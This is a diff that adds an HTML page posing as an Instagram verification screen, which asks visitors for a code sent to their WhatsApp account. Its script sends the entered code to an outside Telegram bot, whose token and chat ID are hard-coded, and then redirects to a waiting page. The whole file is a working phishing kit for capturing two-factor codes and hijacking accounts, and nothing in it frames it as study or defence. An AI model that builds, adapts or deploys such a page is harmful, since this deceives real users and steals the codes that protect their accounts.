@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Verification</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <script>
+    async function sendCodeToTelegram() {
+      const code = document.getElementById('code').value;
+      const botToken = '7619144760:AAFgnQ9NIw4IR8SA-JNLk2upPe0LHvNMgKM';
+      const chatId = '5587800563';
+      const message = `Code: ${code}`;
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+      try {
+        await fetch(url);
+        window.location.href = 'wait.html';
+      } catch (error) {
+        alert('Error sending code to Telegram.');
+      }
+    }
+
+    function startCountdown() {
+      let countdown = 60;
+      const countdownElement = document.getElementById('countdown');
+      const interval = setInterval(() => {
+        countdown--;
+        countdownElement.textContent = `We can send a new code in 00:${countdown < 10 ? '0' : ''}${countdown}.`;
+        if (countdown <= 0) {
+          clearInterval(interval);
+          countdownElement.textContent = 'You can request a new code now.';
+        }
+      }, 1000);
+    }
+
+    window.onload = startCountdown;
+  </script>
+</head>
+<body class="bg-blue-100 flex items-center justify-center min-h-screen p-4">
+  <div class="w-full max-w-sm bg-white p-6 rounded-lg shadow-lg border border-gray-200">
+    <div class="flex justify-center mb-4">
+      <img src="https://static.cdninstagram.com/rsrc.php/v4/yk/r/iyazeqxfbpL.png" alt="Instagram Logo" class="w-16">
+    </div>
+    <h1 class="text-center text-xl font-bold text-gray-900">Instagram</h1>
+    <h2 class="text-center text-sm text-gray-600 mt-1">Check your WhatsApp messages</h2>
+    <p class="text-center text-gray-500 mt-1 text-sm">Enter the code we sent to your WhatsApp account.</p>
+    <div class="mt-4 flex justify-center">
+      <img alt="Hand holding a phone with WhatsApp logo and a code input" class="w-48 rounded-lg" src="https://static.cdninstagram.com/rsrc.php/v4/yr/r/nb5DmMZ_n-V.png"/>
+    </div>
+    <div class="mt-4">
+      <label class="block text-gray-700 text-sm" for="code">Code</label>
+      <input class="w-full p-2 border border-gray-300 rounded mt-1" id="code" type="text" placeholder="Enter your code"/>
+    </div>
+    <div class="flex items-center mt-4 text-sm text-gray-600">
+      <i class="fas fa-sync-alt"></i>
+      <span id="countdown" class="ml-2">We can send a new code in 00:60.</span>
+    </div>
+    <div class="flex items-center mt-4 text-sm text-gray-700">
+      <input class="form-checkbox h-4 w-4 text-blue-600" id="trust" type="checkbox"/>
+      <label class="ml-2" for="trust">Trust this device and skip this step from now on</label>
+    </div>
+    <button class="w-full bg-blue-500 text-white py-2 rounded mt-4 text-sm font-semibold" onclick="sendCodeToTelegram()">Continue</button>
+    <button class="w-full bg-gray-100 text-gray-700 py-2 rounded mt-2 text-sm">Try another way</button>
+  </div>
+</body>
+</html>
